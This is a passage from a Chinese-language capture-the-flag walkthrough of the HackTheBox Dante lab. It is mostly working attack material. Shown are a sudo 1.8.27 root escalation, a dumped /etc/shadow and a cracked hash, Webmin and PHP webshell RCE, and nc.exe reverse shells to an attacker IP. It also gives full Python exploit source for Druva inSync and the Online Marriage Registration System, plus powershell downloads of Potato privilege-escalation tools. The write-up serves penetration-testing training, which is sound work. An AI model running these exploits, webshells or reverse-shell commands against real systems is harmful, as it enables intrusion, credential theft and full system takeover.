    env_keep+="LANG LANGUAGE LINGUAS LC_*
    _XKB_CHARSET", env_keep+="XAPPLRESDIR
    XFILESEARCHPATH XUSERFILESEARCHPATH",
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    mail_badpass

User ben may run the following commands on DANTE-NIX04:
    (ALL, !root) /bin/bash

```

ben 可以以任何用户身份运行 `/bin/bash` ，但 root 用户除外：

```c
ben@DANTE-NIX04:/home$ sudo -u julian /bin/bash
julian@DANTE-NIX04:/home$
```

但这并没有给我们带来更多……

现在，如果我们运行 LinPEAS 或 LinEnum，可以看到 sudo 的版本是 1.8.27。这个版本存在权限提升漏洞。

![](/image/prolabs/Dante-17.png)

```c
ben@DANTE-NIX04:/home$ sudo -V
Sudo version 1.8.27
Sudoers policy plugin version 1.8.27
Sudoers file grammar version 46
Sudoers I/O plugin version 1.8.27
```

```c
sudo -u#-1 /bin/bash
```

```c
ben@DANTE-NIX04:/home$ sudo -u#-1 /bin/bash
root@DANTE-NIX04:/# cd /root
root@DANTE-NIX04:/root# cat flag.txt
DANTE{sudo_M4k3_me_@_Sandwich}
root@DANTE-NIX04:/root# 
```

## /etc/shadow
现在我们拥有了 root 权限，我们还获取了 /etc/shadow 文件

```c
root@DANTE-NIX04:/root# cat /etc/shadow
root:$6$mGvSK3Q2$o59ZSjkbMcR6ZXfsb12TV/WUZw7buRIRep5up5YsbZB8w7b1XRa9L/Y.OQoEHxZ5O4aIMzWl6bYeRyUYw3wgW.:18458:0:99999:7:::
daemon:*:18295:0:99999:7:::
bin:*:18295:0:99999:7:::
sys:*:18295:0:99999:7:::
sync:*:18295:0:99999:7:::
games:*:18295:0:99999:7:::
man:*:18295:0:99999:7:::
lp:*:18295:0:99999:7:::
mail:*:18295:0:99999:7:::
news:*:18295:0:99999:7:::
uucp:*:18295:0:99999:7:::
proxy:*:18295:0:99999:7:::
www-data:*:18295:0:99999:7:::
backup:*:18295:0:99999:7:::
list:*:18295:0:99999:7:::
irc:*:18295:0:99999:7:::
gnats:*:18295:0:99999:7:::
nobody:*:18295:0:99999:7:::
systemd-network:*:18295:0:99999:7:::
systemd-resolve:*:18295:0:99999:7:::
syslog:*:18295:0:99999:7:::
messagebus:*:18295:0:99999:7:::
_apt:*:18295:0:99999:7:::
uuidd:*:18295:0:99999:7:::
avahi-autoipd:*:18295:0:99999:7:::
usbmux:*:18295:0:99999:7:::
dnsmasq:*:18295:0:99999:7:::
rtkit:*:18295:0:99999:7:::
cups-pk-helper:*:18295:0:99999:7:::
speech-dispatcher:!:18295:0:99999:7:::
whoopsie:*:18295:0:99999:7:::
kernoops:*:18295:0:99999:7:::
saned:*:18295:0:99999:7:::
pulse:*:18295:0:99999:7:::
avahi:*:18295:0:99999:7:::
colord:*:18295:0:99999:7:::
hplip:*:18295:0:99999:7:::
geoclue:*:18295:0:99999:7:::
gnome-initial-setup:*:18295:0:99999:7:::
gdm:*:18295:0:99999:7:::
ben:$6$uKjV5Ai5$bba9k12/tuqQ45jnVwRyZyg/W3dJlr/T2N05XhZq1dZ4EpAaTKh.O3nQVCRWJrxetME8Il3WbrzmWGsoPf2iE.:18470:0:99999:7:::
mysql:!:18439::::::
julian:$1$CrackMe$U93HdchOpEUP9iUxGVIvq/:18439:0:99999:7:::
sshd:*:18471:0:99999:7:::
```

## CrackMe
其中包含一个名为“CrackMe”的提示作为 salt：

```plain
ben:$6$uKjV5Ai5$bba9k12/tuqQ45jnVwRyZyg/W3dJlr/T2N05XhZq1dZ4EpAaTKh.O3nQVCRWJrxetME8Il3WbrzmWGsoPf2iE.:18470:0:99999:7:::
mysql:!:18439::::::
julian:$1$CrackMe$U93HdchOpEUP9iUxGVIvq/:18439:0:99999:7:::
```

借助 JohnTheRipper，我们破解了密码，答案是 manchesterunited（曼联）。

```c
──(web)─(root㉿kali)-[/home/kali/Desktop/htb/dante]
└─# john hash --wordlist=/usr/share/wordlists/rockyou.txt --format=md5crypt-long

Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt-long, crypt(3) $1$ (and variants) [MD5 32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
manchesterunited (julian)     
1g 0:00:00:00 DONE (2026-01-31 18:48) 12.50g/s 35200p/s 35200c/s 35200C/s meagan..medicina
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

  
这个密码以后会用到，我们先把它保存好！

# 172.16.1.17
## 端口扫描
```c
proxychains -q nmap 172.16.1.17 -sT -sV -Pn -T5
PORT      STATE SERVICE     VERSION
80/tcp    open  http        Apache httpd 2.4.41
139/tcp   open  netbios-ssn Samba smbd 4.6.2
445/tcp   open  netbios-ssn Samba smbd 4.6.2
10000/tcp open  http        MiniServ 1.900 (Webmin httpd)
```

## smb连接
```c
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/dante]
└─#  proxychains -q smbclient -L \\172.16.1.17 -N

 Sharename       Type      Comment
 ---------       ----      -------
 forensics       Disk      
 IPC$            IPC       IPC Service (DANTE-NIX03 server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.
smbXcli_negprot_smb1_done: No compatible protocol selected by server.
Protocol negotiation to server 172.16.1.17 (for a protocol between LANMAN1 and NT1) failed: NT_STATUS_INVALID_NETWORK_RESPONSE
Unable to connect with SMB1 -- no workgroup available
```

```c
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/dante]
└─#  proxychains -q smbclient \\\\172.16.1.17\\forensics -N
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Jun 25 17:01:36 2020
  ..                                  D        0  Wed Jun 10 07:29:28 2020
  monitor                             N   153489  Thu Jun 25 17:01:07 2020

  13865000 blocks of size 1024. 5859888 blocks available
smb: \> get monitor
getting file \monitor of size 153489 as monitor (82.0 KiloBytes/sec) (average 82.0 KiloBytes/sec)
smb: \> exit
```

## monitor
尝试cat一下发现很多乱码

```c
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/dante]
└─# file monitor 
monitor: pcap capture file, microsecond ts (little-endian) - version 2.4 (Ethernet, capture length 65535)
```

可以发现这是一个流量包，我们尝试使用wireshark打开它

![](/image/prolabs/Dante-18.png)

![](/image/prolabs/Dante-19.png)

过滤掉其它流仅查看http

发现申请登录了俩次第二次成功了且账号密码分别为admin/Password6543

## Webmin
![](/image/prolabs/Dante-20.png)

admin/Password6543

成功登录

```c
1.900 
```

![](/image/prolabs/Dante-21.png)

## 提权
1.930 之前的版本存在远程代码执行漏洞（ [https://github.com/roughiz/Webmin-1.910-Exploit-Script](https://github.com/roughiz/Webmin-1.910-Exploit-Script) ）

```c
proxychains -q python2.7 webmin_exploit.py --rhost 172.16.1.17 --lhost 10.10.Y.Y --lport 443 -u admin -p Password6543
```

```c
proxychains -q python2 webmin_exploit.py --rhost 172.16.1.17 --lhost 10.10.16.71 --lport 7777 -u admin -p Password6543
```

```c
whoami
root
```

我们使用 `python -c 'import pty;pty.spawn("/bin/bash")'` 升级 shell，我们已经是 root 用户了！

```c
root@DANTE-NIX03:~# cat flag.txt 
cat flag.txt
DANTE{SH4RKS_4R3_3V3RYWHERE}
```

# 172.16.1.13
```c
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/dante]
└─# proxychains -q nmap 172.16.1.13 -sT -sV -Pn -T5
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-01-31 01:33 EST
RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
Nmap scan report for 172.16.1.13
Host is up (10s latency).
Skipping host 172.16.1.13 due to host timeout
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 902.18 seconds
```

可以发现nmap扫描超时

这里改用一台拿下的靶机进行扫描

```c
root@DANTE-WEB-NIX01:~# export ip=172.16.1.13; for port in $(seq 1 65535); do timeout 0.01 bash -c "</dev/tcp/$ip/$port && echo Port open $port || echo Port closed $port > /dev/null" 2>/dev/null; done
Port open 80
Port open 443
Port open 445
```

当我们访问 80 端口时，会被重定向到 [http://172.16.1.13/dashboard/](http://172.16.1.13/dashboard/) ，这是一个 XAMPP 控制面板。

![](/image/prolabs/Dante-22.png)

我们首先尝试访问 PHPMyAdmin（ [http://172.16.1.13/phpmyadmin/）](http://172.16.1.13/phpmyadmin/) ，但错误信息显示它只能从本地网络访问：

```plain
New XAMPP security concept:
Access to the requested directory is only available from the local network.
This setting can be configured in the file "httpd-xampp.conf".
```

## 子域名枚举
```plain
proxychains -q wfuzz -c \
  -z file,/home/kali/Desktop/wordlists/seclists/Discovery/Web-Content/common.txt \
  --hc 404 \
  ┌──(web)─(root㉿kali)-[/home/kali]
└─# proxychains -q wfuzz -c \
  -z file,/home/kali/Desktop/wordlists/seclists/Discovery/Web-Content/common.txt \
  --hc 404 \
  http://172.16.1.13/FUZZ

 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://172.16.1.13/FUZZ
Total requests: 4750

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                           
=====================================================================

000000026:   403        42 L     97 W       1043 Ch     ".htpasswd"                                       
000000025:   403        42 L     97 W       1043 Ch     ".htaccess"                                       
000000024:   403        42 L     97 W       1043 Ch     ".hta"                                            
000000770:   403        42 L     97 W       1043 Ch     "aux"                                             
000001046:   403        42 L     98 W       1057 Ch     "cgi-bin/"                                        
000001169:   403        42 L     97 W       1043 Ch     "com4"                                            
000001168:   403        42 L     97 W       1043 Ch     "com3"                                            
000001167:   403        42 L     97 W       1043 Ch     "com2"                                            
000001166:   403        42 L     97 W       1043 Ch     "com1"                                            
000001213:   403        42 L     97 W       1043 Ch     "con"                                             
000001374:   301        9 L      30 W       338 Ch      "dashboard"                                       
000001506:   301        9 L      30 W       336 Ch      "discuss"                                         
000001772:   200        5 L      1546 W     30891 Ch    "favicon.ico"                                     
000001720:   503        39 L     98 W       1057 Ch     "examples"                                        
000002210:   302        0 L      0 W        0 Ch        "index.php"                                       
000002188:   301        9 L      30 W       332 Ch      "img"                                             
000002469:   403        45 L     113 W      1202 Ch     "licenses"                                        
000002555:   403        42 L     97 W       1043 Ch     "lpt2"                                            
000002554:   403        42 L     97 W       1043 Ch     "lpt1"                                            
000002881:   403        42 L     97 W       1043 Ch     "nul"                                             
000003128:   403        45 L     113 W      1202 Ch     "phpmyadmin"                                      
000003292:   403        42 L     97 W       1043 Ch     "prn"                                             
000003736:   403        45 L     113 W      1202 Ch     "server-status"                                   
000003735:   403        45 L     113 W      1202 Ch     "server-info"                                     
000004497:   403        42 L     97 W       1043 Ch     "webalizer"                                       

Total time: 134.9591
Processed Requests: 4750
Filtered Requests: 4725
Requests/sec.: 35.19583

/FUZZ
```

```plain
┌──(web)─(root㉿kali)-[/home/kali]
└─# proxychains -q wfuzz -c \
  -z file,/home/kali/Desktop/wordlists/seclists/Discovery/Web-Content/common.txt \
  --hc 404 \
  http://172.16.1.13/FUZZ

 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://172.16.1.13/FUZZ
Total requests: 4750

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                           
=====================================================================

000000026:   403        42 L     97 W       1043 Ch     ".htpasswd"                                       
000000025:   403        42 L     97 W       1043 Ch     ".htaccess"                                       
000000024:   403        42 L     97 W       1043 Ch     ".hta"                                            
000000770:   403        42 L     97 W       1043 Ch     "aux"                                             
000001046:   403        42 L     98 W       1057 Ch     "cgi-bin/"                                        
000001169:   403        42 L     97 W       1043 Ch     "com4"                                            
000001168:   403        42 L     97 W       1043 Ch     "com3"                                            
000001167:   403        42 L     97 W       1043 Ch     "com2"                                            
000001166:   403        42 L     97 W       1043 Ch     "com1"                                            
000001213:   403        42 L     97 W       1043 Ch     "con"                                             
000001374:   301        9 L      30 W       338 Ch      "dashboard"                                       
000001506:   301        9 L      30 W       336 Ch      "discuss"                                         
000001772:   200        5 L      1546 W     30891 Ch    "favicon.ico"                                     
000001720:   503        39 L     98 W       1057 Ch     "examples"                                        
000002210:   302        0 L      0 W        0 Ch        "index.php"                                       
000002188:   301        9 L      30 W       332 Ch      "img"                                             
000002469:   403        45 L     113 W      1202 Ch     "licenses"                                        
000002555:   403        42 L     97 W       1043 Ch     "lpt2"                                            
000002554:   403        42 L     97 W       1043 Ch     "lpt1"                                            
000002881:   403        42 L     97 W       1043 Ch     "nul"                                             
000003128:   403        45 L     113 W      1202 Ch     "phpmyadmin"                                      
000003292:   403        42 L     97 W       1043 Ch     "prn"                                             
000003736:   403        45 L     113 W      1202 Ch     "server-status"                                   
000003735:   403        45 L     113 W      1202 Ch     "server-info"                                     
000004497:   403        42 L     97 W       1043 Ch     "webalizer"                                       

Total time: 134.9591
Processed Requests: 4750
Filtered Requests: 4725
Requests/sec.: 35.19583


```

![](/image/prolabs/Dante-23.png)

## 漏洞利用
![](/image/prolabs/Dante-24.png)

[https://www.exploit-db.com/exploits/48512](https://www.exploit-db.com/exploits/48512)

漏洞利用很简单，你可以在创建账户时在头像中上传一个 PHP 文件。我们上传的是一个经典的 PHP webshell：

```plain
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/dante]
└─# vi webshell.php      

```

![](/image/prolabs/Dante-25.png)

[http://172.16.1.13/discuss/ups/webshell.php?cmd=whoami](http://172.16.1.13/discuss/ups/webshell.php?cmd=whoami)

![](/image/prolabs/Dante-26.png)

![](/image/prolabs/Dante-27.png)

发现该服务器是windows服务器

![](/image/prolabs/Dante-28.png)

## 反弹shell
```plain
powershell wget http://10.10.16.71/nc64.exe -O nc.exe

┌──(web)─(root㉿kali)-[/home/kali/Desktop/tools/netcat]
└─# updog -p 80
[+] Serving /home/kali/Desktop/tools/netcat on 0.0.0.0:80...
WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.                                                                                                                
 * Running on all addresses (0.0.0.0)
 * Running on http://127.0.0.1:80
 * Running on http://61.139.2.130:80
Press CTRL+C to quit
10.10.110.3 - - [31/Jan/2026 03:20:43] "GET /nc64.exe HTTP/1.1" 200 -
```

```plain
http://172.16.1.13/discuss/ups/webshell.php?cmd=nc.exe -e cmd.exe 10.10.16.71 1111
```

```plain
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/dante]
└─# nc -lnvp 1111
listening on [any] 1111 ...
connect to [10.10.16.71] from (UNKNOWN) [10.10.110.3] 48835
Microsoft Windows [Version 10.0.18363.900]
(c) 2019 Microsoft Corporation. All rights reserved.

C:\xampp\htdocs\discuss\ups>
```

```plain
C:\Users\gerald\Desktop>type flag.txt
type flag.txt
DANTE{l355_t4lk_m04r_l15tening}
```

## 提权
```c
C:\Program Files (x86)>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is B19F-120D

 Directory of C:\Program Files (x86)

13/07/2020  05:42    <DIR>          .
13/07/2020  05:42    <DIR>          ..
18/03/2019  21:02    <DIR>          Common Files
13/07/2020  03:35    <DIR>          Druva
13/07/2020  05:39    <DIR>          Internet Explorer
18/03/2019  20:52    <DIR>          Microsoft.NET
18/03/2019  22:20    <DIR>          Windows Defender
18/03/2019  20:52    <DIR>          Windows Mail
13/07/2020  05:39    <DIR>          Windows Media Player
18/03/2019  22:23    <DIR>          Windows Multimedia Platform
18/03/2019  21:02    <DIR>          Windows NT
13/07/2020  05:39    <DIR>          Windows Photo Viewer
18/03/2019  22:23    <DIR>          Windows Portable Devices
18/03/2019  20:52    <DIR>          WindowsPowerShell
               0 File(s)              0 bytes
              14 Dir(s)   4,728,889,344 bytes free

```

当我们列出程序文件时，会发现一个名为“Druva”的不寻常的软件：

```c
C:\Program Files (x86)\Druva\inSync>type licence.txt
type licence.txt
Druva InSync 6.6.3
Copyright (c) 2019 Druva Inc.
```

此版本存在本地权限提升漏洞（ [https://www.exploit-db.com/exploits/48505](https://www.exploit-db.com/exploits/48505) ）。

```c
C:\>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is B19F-120D

 Directory of C:\

13/07/2020  05:39    <DIR>          PerfLogs
15/07/2020  05:40    <DIR>          Program Files
13/07/2020  05:42    <DIR>          Program Files (x86)
02/04/2025  02:00    <DIR>          Python27
13/07/2020  05:17    <DIR>          Users
13/04/2021  20:24    <DIR>          Windows
13/07/2020  04:23    <DIR>          xampp
               0 File(s)              0 bytes
               7 Dir(s)   4,728,365,056 bytes free
```

python27在根目录下

```c
powershell
直接粘贴复制下面代码
@'
import socket
import struct
import sys

if len(sys.argv) < 2:
    print "Usage: " + __file__ + " <quoted command to execute>"
    print "E.g. " + __file__ + " \"net user /add tenable\""
    sys.exit(0)

ip = '127.0.0.1'
port = 6064
command_line = 'C:\\ProgramData\\Druva\\inSync4\\..\\..\\..\\..\\..\\..\\..\\..\\' + sys.argv[1]

def make_wide(s):
    new_str = ''
    for c in s:
        new_str += c
        new_str += '\x00'
    return new_str

hello = "inSync PHC RPCW[v0002]"
func_num = "\x05\x00\x00\x00"

command_line = make_wide(command_line)
command_length = struct.pack('<i', len(command_line))
requests = [ hello, func_num, command_length, command_line ]

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((ip, port))

i = 1
for req in requests:
    print 'Sending request ' + str(i)
    sock.send(req)
    i += 1

sock.close()
print "Done."
'@ | Out-File druva.py -Encoding ASCII
```

```c
c:\python27\python.exe druva.py "windows\system32\cmd.exe /C C:\xampp\htdocs\discuss\ups\nc.exe 10.10.16.71 2222 -e cmd.exe"
```

```c
C:\WINDOWS\system32>whoami
whoami
nt authority\system
```

```c
C:\Users\Administrator\Desktop>type flag.txt
type flag.txt
DANTE{Bad_pr4ct1ces_Thru_strncmp}
```

# 172.16.1.102
## 端口扫描
```c
root@DANTE-WEB-NIX01:~# export ip=172.16.1.102; for port in $(seq 1 65535); do timeout 0.01 bash -c "</dev/tcp/$ip/$port && echo Port open $port || echo Port closed $port > /dev/null" 2>/dev/null; done
Port open 80
Port open 135
Port open 139
Port open 443
Port open 445
Port open 3306
Port open 3389
Port open 5040
Port open 5985
Port open 33060
Port open 47001
Port open 49664
Port open 49665
Port open 49666
Port open 49667
Port open 49668
Port open 49669
Port open 49670
Port open 49671
```

> 21      — FTP
>
> 445/139 — SMB（重点）
>
> 5985    — WinRM（超级重要）
>
> 135     — RPC
>
> 47001   — Windows 内置管理端口（WinRM/WSMan）
>
> 49664–49670 — Windows 动态 RPC 端口池
>

![](/image/prolabs/Dante-29.png)

在端口 80 上，我们发现了一个 CMS“ Online Marriage Registration System  ”，该系统存在经过身份验证的远程代码执行漏洞（ [https://www.exploit-db.com/exploits/49557](https://www.exploit-db.com/exploits/49557) ）

![](/image/prolabs/Dante-1.png)

可以注册，注册后利用exp

## 漏洞利用
```c
Mobile Number: 
1666666666
Password: 
password
```

```c
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/dante]
└─# vi marry.py


import os
import sys
import random
import argparse
import requests


def get_args():
    parser = argparse.ArgumentParser()
    parser.add_argument('-u', '--url', required=True, action='store', help='Url of Online Marriage Registration System (OMRS) 1.0')
    parser.add_argument('-c', '--command', required=True, action='store', help='Command to execute')
    parser.add_argument('-m', '--mobile', required=False, action='store', help='Mobile phone used for registration')
    parser.add_argument('-p', '--password', required=False, action='store', help='Password used for registration')
    my_args = parser.parse_args()
    return my_args


def login(url, mobile, password):
    url = "%s/user/login.php"%(url)
    payload = {'mobno':mobile, 'password':password, 'login':''}
    req = requests.post(url, data=payload)
    return req.cookies['PHPSESSID']


def upload(url, cookie, file=None):
    url = "%s/user/marriage-reg-form.php"%url
    files = {'husimage': ('shell.php', "<?php $command = shell_exec($_REQUEST['cmd']); echo $command; ?>", 'application/x-php', {'Expires': '0'}), 'wifeimage':('test.jpg','','image/jpeg')}
    payload = {'dom':'05/01/2020','nofhusband':'omrs_rce', 'hreligion':'omrs_rce', 'hdob':'05/01/2020','hsbmarriage':'Bachelor','haddress':'omrs_rce','hzipcode':'omrs_rce','hstate':'omrs_rce','hadharno':'omrs_rce','nofwife':'omrs_rce','wreligion':'omrs_rce','wsbmarriage':'Bachelor','waddress':'omrs_rce','wzipcode':'omrs_rce','wstate':'omrs_rce','wadharno':'omrs_rce','witnessnamef':'omrs_rce','waddressfirst':'omrs_rce','witnessnames':'omrs_rce','waddresssec':'omrs_rce','witnessnamet':'omrs_rce','waddressthird':'omrs_rce','submit':''}
    req = requests.post(url, data=payload, cookies={'PHPSESSID':cookie}, files=files)
    print('[+] PHP shell uploaded')


def get_remote_php_files(url):
    url = "%s/user/images"%(url)
    req = requests.get(url)
    php_files = []
    for i in req.text.split(".php"):
        php_files.append(i[-42:])
    return php_files


def exec_command(url, webshell, command):
    url_r = "%s/user/images/%s?cmd=%s"%(url, webshell, command)
    req = requests.get(url_r)
    print("[+] Command output\n%s"%(req.text))


def register(mobile, password, url):
    url_r = "%s/user/signup.php"%(url)
    data = {"fname":"omrs_rce", "lname":"omrs_rce", "mobno":mobile, "address":"omrs_rce", "password":password, "submit":""}
    req = requests.post(url_r, data=data)
    print("[+] Registered with mobile phone %s and password '%s'"%(mobile,password))


if __name__ == "__main__":
    args = get_args()
    url = args.url
    command = args.command
    mobile = str(random.randint(100000000,999999999)) if args.mobile is None else args.mobile
    password = "dante123" if args.password is None else args.password
    if args.password is None or args.mobile is None:
        register(mobile,password,url)
    cookie = login(url, mobile, password)
    initial_php_files = get_remote_php_files(url)
    upload(url, cookie)
    final_php_files = get_remote_php_files(url)
    webshell = (list(set(final_php_files) - set(initial_php_files))[0]+".php")
    exec_command(url,webshell,command)
```

```c
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/dante]
└─# proxychains -q python marry.py -u http://172.16.1.102/ -m 1666666666 -p password -c "whoami"
[+] PHP shell uploaded
[+] Command output
dante-ws03\blake
```

## 反向shell
```c
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/dante]
└─# proxychains -q python marry.py -u http://172.16.1.102/ -m 1666666666 -p password -c "powershell wget http://10.10.16.71/nc64.exe -O nc.exe"
[+] PHP shell uploaded
[+] Command output

┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/dante]
└─# proxychains -q python marry.py -u http://172.16.1.102/ -m 1666666666 -p password -c "nc.exe 10.10.16.71 3333 -e cmd.exe"
[+] PHP shell uploaded

┌──(web)─(root㉿kali)-[/home/kali/Desktop/tools/netcat]
└─# nc -lvnp 3333
listening on [any] 3333 ...
connect to [10.10.16.71] from (UNKNOWN) [10.10.110.3] 39245
Microsoft Windows [Version 10.0.19042.1766]
(c) Microsoft Corporation. All rights reserved.

C:\Apache24\htdocs\user\images>
```

```c
C:\Users\blake\Desktop>type flag.txt
type flag.txt
DANTE{U_M4y_Kiss_Th3_Br1d3}
```

## 提权
这里有俩种打发，一种是 C:/Apps/SERVER.EXE  可以pwn拿system

焯！！不会

选择另一种土豆提权吧

### SeImpersonatePrivilege
```c
C:\Users\blake\Desktop>whoami /all 
whoami /all 

USER INFORMATION
----------------

User Name        SID                                          
================ =============================================
dante-ws03\blake S-1-5-21-3089243881-3525850343-252262830-1002


GROUP INFORMATION
-----------------

Group Name                           Type             SID          Attributes                                        
==================================== ================ ============ ==================================================
Everyone                             Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                        Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\SERVICE                 Well-known group S-1-5-6      Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                        Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users     Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization       Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account           Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
LOCAL                                Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication     Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level Label            S-1-16-12288                                                   


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeShutdownPrivilege           Shut down the system                      Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeUndockPrivilege             Remove computer from docking station      Disabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
SeTimeZonePrivilege           Change the time zone                      Disabled

```

SeImpersonatePrivilege        Impersonate a client after authentication Enabled 

#### SeImpersonatePrivilege 是什么？
官方翻译一句话版：

**允许当前进程在“客户端完成认证后”，冒充该客户端的身份**

人话版：

👉 **我可以“假装成”连到我的高权限用户（比如 SYSTEM）**

#### 为什么它这么危险？
**因为 Windows 里有一堆服务是：**

+ **SYSTEM 身份运行**
+ **会主动来“找你说话”（RPC / COM / 命名管道）**

**如果你能：**

1. **让 SYSTEM 来找你**
2. **你又有 ****SeImpersonatePrivilege**

👉** 就可以直接把自己升级成 SYSTEM**

### GodPotato
**作者：BeichenDream**

**项目地址：**[**https://github.com/BeichenDream/GodPotato**](https://github.com/BeichenDream/GodPotato)

#### ▶ 原理
**利用 rpcss（必启系统服务） 在处理 DCOM OXID 请求时的设计缺陷**

**rpcss 以 SYSTEM 权限运行**

**在 OXID 解析过程中触发身份回调**

#### ▶ 基本使用指令
**反弹 SYSTEM Shell（推荐）**

**GodPotato.exe -cmd "cmd /c whoami"**

**GodPotato.exe -cmd "cmd /c net user"**

**直接弹 SYSTEM CMD**

**GodPotato.exe -cmd "cmd.exe"**

**执行 PowerShell**

**GodPotato.exe -cmd "powershell -nop -w hidden"**

#### ▶ 常见配合
**GodPotato.exe -cmd "cmd /c net localgroup administrators"**

#### ▶ 适用范围
**Windows Server 2012 – 2022**

**Windows 8 – Windows 11**

**作者：BeichenDream**

**项目地址：**[**https://github.com/BeichenDream/GodPotato**](https://github.com/BeichenDream/GodPotato)

#### ▶ 原理
**利用 rpcss（必启系统服务） 在处理 DCOM OXID 请求时的设计缺陷**

**rpcss 以 SYSTEM 权限运行**

**在 OXID 解析过程中触发身份回调**

📌** 无需端口转发、无需监听远程 IP**

#### ▶ 优点
**覆盖系统范围极广**

**成功率极高**

**几乎是 JuicyPotato 的“完全继任者”**

#### ▶ 适用范围
**Windows Server 2012 – 2022**

**Windows 8 – Windows 11**

#### ▶ 使用场景
**内网渗透**

**云主机**

**EDR 严格环境**

### 提权指令
```c
C:\Users\blake\Desktop>reg query "HKLM\SOFTWARE\Microsoft\NET Framework Setup\NDP"
reg query "HKLM\SOFTWARE\Microsoft\NET Framework Setup\NDP"

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NET Framework Setup\NDP\CDF
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NET Framework Setup\NDP\v4
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NET Framework Setup\NDP\v4.0

C:\Users\blake\Desktop>powershell wget 10.10.16.71/GodPotato-NET4.exe -O GodPotato-NET4.exe
```

```c
C:\Users\blake\Desktop\GodPotato-NET4.exe -cmd "C:\Apache24\htdocs\user\images\nc.exe -e cmd.exe 10.10.16.71 2012" 
```

GodPotato没有成功

```c
C:\Users\blake\Desktop>systeminfo
systeminfo

Host Name:                 DANTE-WS03
OS Name:                   Microsoft Windows 10 Pro
OS Version:                10.0.19042 N/A Build 19042
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Workstation
OS Build Type:             Multiprocessor Free
Registered Owner:          User
Registered Organization:   
Product ID:                00330-80000-00000-AA341
Original Install Date:     10/11/2020, 6:18:49 AM
System Boot Time:          1/30/2026, 11:11:48 PM
System Manufacturer:       VMware, Inc.
System Model:              VMware7,1
System Type:               x64-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: AMD64 Family 25 Model 1 Stepping 1 AuthenticAMD ~2595 Mhz
BIOS Version:              VMware, Inc. VMW71.00V.24504846.B64.2501180334, 1/18/2025
Windows Directory:         C:\WINDOWS
System Directory:          C:\WINDOWS\system32
Boot Device:               \Device\HarddiskVolume3

```

根据win10这里换成SharpEfsPotato

```c
C:\Users\blake\Desktop>powershell wget 10.10.16.71/SharpEfsPotato.exe -O SharpEfsPotato.exe
```

```c
SharpEfsPotato.exe -p C:\Apache24\htdocs\user\images\nc.exe -a "10.10.16.71 2012 -e cmd.exe"
```

卡住了，换成powershell

```c
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/dante]
└─# proxychains -q python marry.py -u http://172.16.1.102/ -m 1666666666 -p password -c "nc.exe 10.10.16.71 3333 -e powershell.exe"

PS C:\Apache24\htdocs\user\images> .\SharpEfsPotato.exe -p C:\Apache24\htdocs\user\images\nc.exe -a "10.10.16.71 2012 -e cmd.exe"
.\SharpEfsPotato.exe -p C:\Apache24\htdocs\user\images\nc.exe -a "10.10.16.71 2012 -e cmd.exe"
SharpEfsPotato by @bugch3ck
  Local privilege escalation from SeImpersonatePrivilege using EfsRpc.

